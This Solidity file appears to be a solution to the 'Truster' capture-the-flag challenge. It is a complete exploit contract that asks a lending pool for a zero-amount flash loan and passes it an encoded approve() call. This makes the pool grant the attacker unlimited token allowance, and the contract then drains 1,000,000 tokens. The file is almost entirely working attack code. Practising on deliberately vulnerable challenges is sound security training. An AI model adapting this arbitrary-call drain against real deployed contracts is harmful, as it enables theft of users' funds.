// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract Exploit_Truster {
    function exploit(
        IERC20 token,
        ITrusterLenderPool pool,
        address receiver
    ) external {
        bytes memory payload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        pool.flashLoan(0, receiver, address(token), payload);

        token.transferFrom(address(pool), receiver, 1_000_000 ether);
    }
}
